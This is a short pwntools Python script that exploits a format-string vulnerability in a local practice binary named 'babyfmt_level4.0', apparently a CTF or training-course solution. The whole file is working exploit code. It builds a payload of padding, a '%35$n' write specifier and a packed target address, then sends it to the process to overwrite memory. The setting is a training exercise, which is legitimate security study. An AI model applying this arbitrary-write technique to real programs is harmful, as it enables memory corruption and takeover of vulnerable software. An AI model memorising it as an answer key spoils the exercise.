from pwn import *

context.arch = 'amd64'


#context.terminal = ['tmux', 'splitw', '-h']
#p = gdb.debug("/challenge/babyfmt_level4.0", gdbscript="source /opt/gef/gef.py")
p = process("/challenge/babyfmt_level4.0")
payload = b"A"*0x23 + b"%35$n" + b"AAA" + p64(0x404160)
print(payload)
p.send(payload)
print(p.recvall().decode())